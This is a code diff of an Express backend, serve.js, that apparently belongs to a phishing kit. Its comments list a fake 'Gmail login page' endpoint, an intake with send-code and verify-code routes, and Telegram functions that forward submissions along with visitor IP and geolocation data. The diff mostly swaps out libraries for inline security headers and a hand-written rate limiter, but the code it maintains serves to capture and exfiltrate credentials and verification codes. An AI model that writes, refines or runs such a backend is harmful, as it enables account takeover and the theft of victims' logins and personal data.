@@ -1,25 +1,37 @@
 /* ============================================================
-   serve.js — Unified backend (no axios, uses native fetch)
+   serve.js — Unified backend
+   Requires ONLY: express, cors, dotenv  (already installed)
+   ============================================================
    • Mistress Scarlett intake → /api/submit, /api/send-code, /api/verify-code
    • Gmail login page         → /api/login
    • Diagnostics              → /health, /api/test-telegram, /api/debug-ip
    ============================================================ */
 
-const express   = require('express');
-const cors      = require('cors');
-const helmet    = require('helmet');
-const rateLimit = require('express-rate-limit');
-const path      = require('path');
+const express = require('express');
+const cors    = require('cors');
+const path    = require('path');
 require('dotenv').config();
 
 const app  = express();
 const PORT = process.env.PORT || 3000;
 
 /* ============================================================
-   MIDDLEWARE
+   INLINE SECURITY HEADERS (replaces helmet)
    ============================================================ */
-app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
+app.use((req, res, next) => {
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'DENY');
+  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+  res.setHeader('X-XSS-Protection', '1; mode=block');
+  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
+  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
+  res.setHeader('Strict-Transport-Security', 'max-age=63072000; includeSubDomains');
+  next();
+});
 
+/* ============================================================
+   CORS
+   ============================================================ */
 app.use(cors({
   origin: '*',
   methods: ['GET', 'POST', 'OPTIONS'],
@@ -33,23 +45,47 @@ app.set('trust proxy', true);
 app.use(express.static(path.join(__dirname), { extensions: ['html'] }));
 
 /* ============================================================
-   RATE LIMITING — JSON response
+   SIMPLE IN-MEMORY RATE LIMITER (replaces express-rate-limit)
+   Per-IP, 100 requests per 15 minutes on /api routes.
    ============================================================ */
-const limiter = rateLimit({
-  windowMs: 15 * 60 * 1000,
-  max: 100,
-  standardHeaders: true,
-  legacyHeaders: false,
-  keyGenerator: (req) =>
-    req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress,
-  handler: (req, res) => {
-    res.status(429).json({
+const RATE_WINDOW_MS = 15 * 60 * 1000;
+const RATE_MAX       = 100;
+const rateBuckets    = new Map();   /* ip → { count, resetAt } */
+
+/* Periodic cleanup so the map doesn't grow forever */
+setInterval(() => {
+  const now = Date.now();
+  for (const [ip, bucket] of rateBuckets) {
+    if (bucket.resetAt < now) rateBuckets.delete(ip);
+  }
+}, 5 * 60 * 1000).unref();
+
+function rateLimitMiddleware(req, res, next) {
+  const ip = getClientIP(req);
+  const now = Date.now();
+  let bucket = rateBuckets.get(ip);
+
+  if (!bucket || bucket.resetAt < now) {
+    bucket = { count: 0, resetAt: now + RATE_WINDOW_MS };
+    rateBuckets.set(ip, bucket);
+  }
+
+  bucket.count += 1;
+
+  res.setHeader('RateLimit-Limit',     RATE_MAX);
+  res.setHeader('RateLimit-Remaining', Math.max(0, RATE_MAX - bucket.count));
+  res.setHeader('RateLimit-Reset',     Math.ceil(bucket.resetAt / 1000));
+
+  if (bucket.count > RATE_MAX) {
+    return res.status(429).json({
       success: false,
       message: 'Too many requests. Please try again in a few minutes.'
     });
   }
-});
-app.use('/api', limiter);
+  next();
+}
+
+app.use('/api', rateLimitMiddleware);
 
 /* ============================================================
    CONFIG
@@ -115,7 +151,7 @@ function clientInfo(req) {
 }
 
 /* ============================================================
-   TELEGRAM — message + photo (native fetch, no axios)
+   TELEGRAM — native fetch (Node 18+)
    ============================================================ */
 async function sendToTelegram(message, opts = {}) {
   const parseMode = opts.parseMode === undefined ? 'HTML' : opts.parseMode;
@@ -135,9 +171,7 @@ async function sendToTelegram(message, opts = {}) {
     });
     const json = await res.json();
 
-    if (!json.ok) {
-      throw new Error('Telegram API error: ' + JSON.stringify(json));
-    }
+    if (!json.ok) throw new Error('Telegram API error: ' + JSON.stringify(json));
 
     console.log('[telegram] sent OK (' + (parseMode || 'plain') + ', ' + message.length + ' chars)');
     return { success: true, data: json };
@@ -163,7 +197,6 @@ async function sendToTelegram(message, opts = {}) {
           })
         });
         const json2 = await res2.json();
-
         if (!json2.ok) throw new Error(JSON.stringify(json2));
 
         console.log('[telegram] retried as plain text — OK');
@@ -201,7 +234,7 @@ async function getIPLocation(ip) {
       return 'Local/Private Network';
     }
 
-    const res = await fetch(`http://ip-api.com/json/${ip}`);
+    const res  = await fetch(`http://ip-api.com/json/${ip}`);
     const data = await res.json();
 
     if (data && data.status === 'success') {
@@ -443,7 +476,8 @@ app.get('/health', (req, res) => {
     timezone: process.env.TIMEZONE || 'Africa/Lagos',
     telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
     botTokenPresent: !!TELEGRAM_BOT_TOKEN,
-    chatIdPresent: !!TELEGRAM_CHAT_ID
+    chatIdPresent: !!TELEGRAM_CHAT_ID,
+    node: process.version
   });
 });
 
@@ -511,6 +545,7 @@ app.use((err, req, res, next) => {
    ============================================================ */
 app.listen(PORT, () => {
   console.log(`\n🚀 Unified backend running on port ${PORT}`);
+  console.log(`   Node:                    ${process.version}`);
   console.log(`   Telegram bot configured: ${TELEGRAM_BOT_TOKEN ? 'Yes' : 'No'}`);
   console.log(`   Chat ID configured:      ${TELEGRAM_CHAT_ID   ? 'Yes' : 'No'}`);
   console.log(`   Timezone:                ${process.env.TIMEZONE || 'Africa/Lagos'}`);
